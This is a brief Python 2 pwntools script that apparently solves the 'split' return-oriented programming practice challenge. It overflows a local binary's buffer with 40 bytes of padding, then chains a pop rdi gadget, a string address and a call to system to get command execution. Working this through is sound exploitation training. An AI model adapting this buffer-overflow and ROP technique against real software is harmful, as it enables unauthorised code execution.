from pwn import *

flag  = p64(0x601065)
pop_rdi = p64(0x0000000000400883)
call_system = p64(0x00400810)

padding = "A"*40

payload = padding + pop_rdi + flag + call_system

p = process('./split')

p.recvuntil("> ")
p.sendline(payload)

print p.recv()
